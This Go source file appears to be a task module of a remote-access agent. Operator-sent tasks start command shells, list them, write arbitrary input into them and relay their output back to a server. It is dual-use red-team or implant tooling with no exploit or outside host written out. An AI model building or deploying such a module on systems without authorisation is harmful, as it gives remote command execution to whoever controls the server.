package main

/*
#include <stdlib.h>
*/
import "C"

import (
	"errors"
	"fmt"
	"strconv"
	"strings"
)

var Interactive map[int][]*Task

type Task struct {
	TaskId string   `json:"taskid"`
	Args   []string `json:"args"`

	// General Purpose
	status   string
	tasktype string
}

func InitialiseTask(task *Task) error {
	if task.Args == nil {
		task.Args = []string{""}
	}
	if Interactive == nil {
		Interactive = make(map[int][]*Task)
	}
	return nil
}

func TaskHandler(task *Task) (stdout []byte, err error) {
	if len(task.Args) < 1 {
		s := []byte("Error in args number")
		return s, errors.New(string(s))
	}
	taskAction := task.Args[0]
	switch taskAction {
	case "list":
		result := "\nStarted Shells\n"
		result += "--------------\n"
		for i := 0; i < len(LIST_SHELL); i++ {

			pidStr := strconv.Itoa(LIST_SHELL[i].Pid)
			result += pidStr
			result += "\n"
		}
		task.status = "completed"
		return []byte(result), nil
	case "start":
		s, err := StartShell()
		if err != nil {
			return nil, err
		}
		task.status = "completed"
		return []byte(fmt.Sprintf("Started CMD with PID %d", s.Pid)), nil
	// Start a task that will never be completed that will send buffer to server
	case "interact-start":
		if len(task.Args) < 2 {
			s := []byte("Error in args number")
			return s, errors.New(string(s))
		}
		pid := task.Args[1]
		var sh *Shell
		for i := 0; i < len(LIST_SHELL); i++ {
			pidInt, err := strconv.Atoi(pid)
			if err != nil {
				return []byte(err.Error()), err
			}
			if LIST_SHELL[i].Pid == pidInt {
				sh = LIST_SHELL[i]
				break
			}

		}

        // Add to list of interactive task
		pidInt, err := strconv.Atoi(pid)
		if err != nil {
			return []byte(err.Error()), err
		}
        // TODO: Add Client Id in the task to avoid concureency between operator
        Interactive[pidInt] = append(Interactive[pidInt], task)

		o, _ := sh.ReadOut()
		e, _ := sh.ReadErr()

		combined := append(o, e...)
		task.status = "ongoing"
		return combined, nil
	case "interact-write":
		if len(task.Args) < 2 {
			s := []byte("Error in args number")
			return s, errors.New(string(s))
		}
		pid := task.Args[1]
		var sh *Shell
		for i := 0; i < len(LIST_SHELL); i++ {
			pidInt, err := strconv.Atoi(pid)
			if err != nil {
				return []byte(err.Error()), err
			}
			if LIST_SHELL[i].Pid == pidInt {
				sh = LIST_SHELL[i]
				break
			}

		}
		command := task.Args[2:]
		input := strings.Join(command, " ")
		err := sh.Write(input)
		task.status = "completed"
		return nil, err
    case "interact-stop":
		if len(task.Args) < 2 {
			s := []byte("Error in args number")
			return s, errors.New(string(s))
		}
		pid := task.Args[1]
		pidInt, err := strconv.Atoi(pid)
		if err != nil {
			return []byte(err.Error()), err
		}
        taskOnGoingList := Interactive[pidInt]
        for _, t := range taskOnGoingList {
            t.status="completed"
        }
        delete(Interactive, pidInt)
		task.status = "completed"
		return []byte("Stopped Interactive shell successfully"), err

	}
	return stdout, err
}

// Tell us if task if done (failed or completed)
func IsTaskDone(task Task) bool {
	if task.status == "completed" || task.status == "failed" {
		return true
	}
	return false
}

// Return Task Status
func ComputeTaskStatus(task Task) string {
	return task.status
}

// Return Task Type For response
func ComputeTaskType(task Task) string {
	if task.Args[0] == "start" {
		return "respstartshell"
	}
	return "respinteractiveshell"
}
